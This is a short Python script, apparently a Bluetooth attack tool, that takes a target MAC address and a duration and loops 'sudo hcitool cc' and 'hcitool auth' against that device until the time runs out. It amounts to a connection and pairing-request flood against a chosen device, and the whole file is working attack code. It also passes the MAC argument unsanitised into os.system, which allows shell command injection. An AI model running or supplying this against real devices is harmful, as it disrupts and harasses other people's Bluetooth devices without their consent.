import time
import os
import sys

attacktimeint = 60

if len(sys.argv) >= 2:
    attackmac = str(sys.argv[1])

if len(sys.argv) >= 3:
    attacktimeint = float(sys.argv[2])

timeout = time.time() + attacktimeint

while True:
    os.system("sudo hcitool cc --role=m "+ attackmac)
    os.system("sudo hcitool auth "+ attackmac )
    if time.time() > timeout:
        break